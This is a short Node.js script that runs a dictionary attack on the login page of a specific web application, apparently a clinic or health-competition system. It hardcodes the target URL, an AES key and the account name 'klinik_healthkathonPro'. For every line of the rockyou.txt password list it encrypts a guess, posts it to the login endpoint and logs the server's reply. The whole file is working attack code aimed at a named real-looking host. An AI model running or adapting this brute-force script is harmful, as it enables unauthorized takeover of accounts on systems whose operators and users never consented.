var request = require("request");
var fs = require("fs");
var CryptoJS = require("crypto-js");
var CryptoJSAesJson = require("./");

let key = "b072xal1G090";
username = CryptoJS.AES.encrypt(JSON.stringify("klinik_healthkathonPro"), key, {
  format: CryptoJSAesJson,
}).toString();
var url = "http://a.f5xcs.alpukat.id/aGVhbHRoa2F0aG9uUHJv-P/login/akses";

var data = {
  username: username,
  password: "",
  typeUser: "3",
  ci_csrf_token: "",
};

var array = fs.readFileSync("rockyou.txt").toString().split("\n");
array.forEach(function (pass) {
  data["password"] = CryptoJS.AES.encrypt(JSON.stringify(pass), key, {
    format: CryptoJSAesJson,
  }).toString();
  request.post(
    { url: url, formData: data },
    function (err, httpResponse, body) {
      if (err) {
        return console.error("gagal:", err);
      }

      console.log("using password: " + pass + " respon:", body);
    }
  );
});
